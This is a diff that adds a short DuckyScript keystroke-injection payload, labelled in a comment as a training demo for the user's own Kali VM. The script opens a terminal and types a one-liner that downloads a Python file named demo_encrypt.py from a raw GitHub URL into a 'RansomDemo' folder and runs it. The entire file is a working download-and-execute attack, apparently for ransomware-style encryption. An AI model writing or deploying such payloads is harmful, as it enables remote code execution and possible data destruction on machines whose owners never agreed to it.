@@ -1,0 +1,11 @@
+REM For the user's own isolated Kali VM. Copy-only training demo.
+DELAY 500
+ALT F2
+DELAY 300
+STRING qterminal
+DELAY 300
+TAB
+ENTER
+DELAY 1000
+STRING mkdir -p /home/kali/Desktop/RansomDemo && wget -q https://raw.githubusercontent.com/what0302/what0302.github.io/master/_posts/demo_encrypt.py -O /home/kali/Desktop/RansomDemo/demo_encrypt.py && python3 /home/kali/Desktop/RansomDemo/demo_encrypt.py
+ENTER
